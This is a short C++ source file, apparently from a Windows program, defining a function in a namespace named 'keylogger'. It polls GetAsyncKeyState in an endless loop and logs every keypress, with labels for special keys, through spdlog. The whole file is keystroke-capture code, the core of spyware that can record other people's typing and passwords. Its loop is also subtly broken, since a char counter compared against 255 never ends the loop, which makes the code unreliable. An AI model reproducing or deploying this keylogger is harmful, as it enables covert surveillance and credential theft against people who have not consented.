#include "common.hpp"

namespace keylogger
{
	static void keylogger()
	{
		while (true)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
			for (char i = 0; i <= 255; i++)
			{
				if (GetAsyncKeyState(i) == -32767)
				{
					switch (i)
					{
					case VK_SHIFT: spdlog::info("SHIFT");
						break;
					case VK_BACK: spdlog::info("BACKSPACE");
						break;
					case VK_LBUTTON: spdlog::info("LBUTTON");
						break;
					case VK_RBUTTON: spdlog::info("RBUTTON");
						break;
					case VK_RETURN: spdlog::info("ENTER");
						break;
					case VK_TAB: spdlog::info("TAB");
						break;
					case VK_ESCAPE: spdlog::info("ESCAPE");
						break;
					case VK_CONTROL: spdlog::info("CTRL");
						break;
					case VK_MENU: spdlog::info("ALT");
						break;
					case VK_CAPITAL: spdlog::info("CAPITAL");
						break;
					case VK_SPACE: spdlog::info("SPACE");
						break;
					case VK_LMENU: spdlog::info("ALT");
						break;
					default:
						spdlog::info(i);
						break;
					}
				}
			}
		}
	}
}